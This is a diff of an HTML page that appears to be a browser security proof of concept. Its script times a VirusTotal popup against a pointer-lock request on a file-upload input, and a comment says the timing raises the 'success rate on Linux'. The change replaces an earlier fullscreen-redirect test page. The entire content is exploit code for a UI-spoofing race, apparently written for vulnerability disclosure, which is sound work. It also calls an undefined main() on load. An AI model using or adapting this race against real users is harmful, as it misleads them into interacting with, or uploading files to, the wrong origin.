@@ -1,7 +1,42 @@
-<iframe src="https://sourc7.appspot.com/html5/api/fullscreen.html" allowfullscreen="yes"></iframe>
-
+<!DOCTYPE html>
+<html>
+<head>
 <script>
-document.onfullscreenchange = function () {
-  location.href = "https://www.google.com"
+
+// setExactTimeout helps increase success rate on Linux platforms (thanks to Mohan pd. Author of The Coders Blog)
+const setExactTimeout = function(callback, duration, resolution) {
+	const start = (new Date()).getTime();
+	const timeout = setInterval(function(){
+		if ((new Date()).getTime() - start > duration) {
+			callback();
+			clearInterval(timeout);
+		}
+	}, resolution);
+
+	return timeout;
 };
+
+function start() {
+    setTimeout(function () {
+        var x = window.open("https://www.virustotal.com/gui/")
+
+        setTimeout(function () {
+            if (document.pointerLockElement === null) {
+                x.close();
+            }
+        }, 33)
+    }, 9)
+
+    setExactTimeout(function () {
+        plt.requestPointerLock();
+    }, 5, 1)
+}
 </script>
+</head>
+
+<body onload="main()">
+    <input id="plt" type="file"></input>
+        <button onclick="start()">Visit VirusTotal to Upload File</button>
+</body>
+
+</html>
